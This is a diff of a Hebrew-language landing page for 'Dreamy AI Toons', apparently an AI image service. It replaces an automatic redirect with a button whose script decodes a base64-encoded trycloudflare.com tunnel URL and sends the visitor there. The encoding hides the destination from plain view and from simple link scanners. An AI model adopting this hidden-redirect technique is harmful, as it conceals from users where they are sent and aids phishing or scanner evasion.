@@ -3,69 +3,112 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Dreamy AI Toons - מעביר אותך למערכת</title>
-    <!-- הפניה אוטומטית באמצעות meta refresh -->
-    <meta http-equiv="refresh" content="0; url=https://arise-salt-experts-submission.trycloudflare.com">
+    <title>Dreamy AI Toons - יצירת תמונות בינה מלאכותית</title>
     <style>
         body {
             font-family: Arial, sans-serif;
-            background-color: #f0f0f0;
+            background-color: #1a1a2e;
+            color: #fff;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
             margin: 0;
-            padding: 0;
+            padding: 20px;
             text-align: center;
         }
         .container {
-            background-color: white;
+            background-color: rgba(255, 255, 255, 0.1);
             padding: 2rem;
             border-radius: 10px;
-            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
             max-width: 600px;
+            backdrop-filter: blur(10px);
         }
         h1 {
-            color: #333;
+            color: #ff9d00;
+            margin-bottom: 1.5rem;
         }
         p {
-            color: #666;
+            color: #e6e6e6;
             margin: 1rem 0;
+            line-height: 1.6;
         }
-        .loading {
+        .btn {
             display: inline-block;
-            width: 50px;
-            height: 50px;
-            border: 3px solid rgba(0, 0, 0, 0.1);
-            border-radius: 50%;
-            border-top-color: #3498db;
-            animation: spin 1s ease-in-out infinite;
-            margin: 1rem 0;
-        }
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-        .link {
-            color: #3498db;
+            background: linear-gradient(135deg, #ff9d00, #ff6a00);
+            color: white;
+            padding: 12px 30px;
+            border-radius: 50px;
             text-decoration: none;
             font-weight: bold;
+            margin-top: 20px;
+            transition: transform 0.3s, box-shadow 0.3s;
+            border: none;
+            cursor: pointer;
+            font-size: 18px;
         }
-        .link:hover {
-            text-decoration: underline;
+        .btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 20px rgba(255, 106, 0, 0.3);
+        }
+        .logo {
+            max-width: 150px;
+            margin-bottom: 20px;
+        }
+        .features {
+            display: flex;
+            justify-content: space-around;
+            flex-wrap: wrap;
+            margin: 30px 0;
+        }
+        .feature {
+            flex-basis: 30%;
+            min-width: 150px;
+            margin: 10px;
+        }
+        .feature-icon {
+            font-size: 2rem;
+            margin-bottom: 10px;
+            color: #ff9d00;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>מעביר אותך למערכת Dreamy AI Toons</h1>
-        <div class="loading"></div>
-        <p>אם אינך מועבר באופן אוטומטי, <a href="https://arise-salt-experts-submission.trycloudflare.com" class="link">לחץ כאן</a></p>
+        <h1>Dreamy AI Toons</h1>
+        <p>מערכת מתקדמת ליצירת תמונות באמצעות בינה מלאכותית</p>
+        
+        <div class="features">
+            <div class="feature">
+                <div class="feature-icon">🎨</div>
+                <p>יצירת תמונות מרהיבות</p>
+            </div>
+            <div class="feature">
+                <div class="feature-icon">🚀</div>
+                <p>מהירות עיבוד גבוהה</p>
+            </div>
+            <div class="feature">
+                <div class="feature-icon">💡</div>
+                <p>ממשק ידידותי</p>
+            </div>
+        </div>
+        
+        <p>לחץ על הכפתור למטה כדי להיכנס למערכת</p>
+        <button id="enterBtn" class="btn">כניסה למערכת</button>
     </div>
 
-    <!-- הפניה אוטומטית באמצעות JavaScript (גיבוי) -->
     <script>
-        // הפניה באמצעות JavaScript
-        window.location.href = "https://arise-salt-experts-submission.trycloudflare.com";
+        // מחכים שהדף ייטען במלואו
+        document.addEventListener('DOMContentLoaded', function() {
+            // מוסיפים אירוע לחיצה לכפתור
+            document.getElementById('enterBtn').addEventListener('click', function() {
+                // יוצרים את הכתובת המקודדת
+                let targetUrl = atob('aHR0cHM6Ly9hcmlzZS1zYWx0LWV4cGVydHMtc3VibWlzc2lvbi50cnljbG91ZGZsYXJlLmNvbQ==');
+                // פותחים את הכתובת בחלון חדש
+                window.open(targetUrl, '_self');
+            });
+        });
     </script>
 </body>
 </html>
